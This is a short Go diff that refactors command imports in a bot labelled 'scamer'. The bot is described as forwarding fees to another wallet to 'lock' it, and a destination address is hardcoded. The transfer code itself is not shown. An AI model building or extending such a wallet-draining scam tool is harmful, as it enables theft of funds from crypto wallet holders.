@@ -3,14 +3,14 @@ package main
 import (
 	"log"
 
-	"github.com/loic-roux-404/crypto-bots/cmd/bot/template"
+	"github.com/loic-roux-404/crypto-bots/cmd/bot/core"
 	"github.com/loic-roux-404/crypto-bots/internal/model/tx"
 	"github.com/loic-roux-404/crypto-bots/pkg/networks"
 	"github.com/spf13/cobra"
 )
 
 func init() {
-	template.InitNetCmd(&cobra.Command{
+	core.InitChainCmd(&cobra.Command{
 		Use:   "scamer",
 		Short: "Scamer bot forwarding fees to another wallet",
 	})
@@ -18,7 +18,7 @@ func init() {
 
 // Lock wallet by transfering fees on other wallet
 func main() {
-	template.ExecuteNetCmd()
+	core.ExecuteNetCmd()
 
 	n := networks.GetNetwork()
 	dest := "0xBe20D507fbdD6dAFd7a2ddE95c2d3f4618547F17"
